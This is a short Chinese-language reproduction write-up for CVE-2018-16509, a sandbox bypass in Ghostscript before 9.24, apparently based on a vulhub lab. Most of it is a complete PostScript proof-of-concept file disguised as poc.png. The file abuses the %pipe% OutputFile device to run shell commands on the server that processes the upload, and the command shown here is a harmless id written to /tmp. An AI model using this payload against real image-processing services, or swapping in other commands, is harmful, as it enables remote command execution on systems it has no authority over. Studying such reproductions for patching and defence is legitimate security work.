# （CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2951](https://www.zhihuifly.com/t/topic/2951)

# （CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞

## 一、漏洞简介

该漏洞源于在处理/invalidaccess异常时，程序没有正确的检测‘restoration of privilege（权限恢复）’。攻击者可通过提交特制的PostScript利用该漏洞执行代码。

## 二、漏洞影响

Ghostscript 9.24之前版本

## 三、复现过程

上传poc.png，将执行命令`id > /tmp/success && cat /tmp/success`。此时进入容器`docker-compose exec web bash`，将可以看到/tmp/success已被创建：

**poc.png**

```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id > /tmp/success && cat /tmp/success) currentdevice putdeviceprops 
```

![image](img/65618c707cb61995c7788dfb39605ee6.png)

## 参考链接

> https://vulhub.org/#/environments/ghostscript/CVE-2018-16509/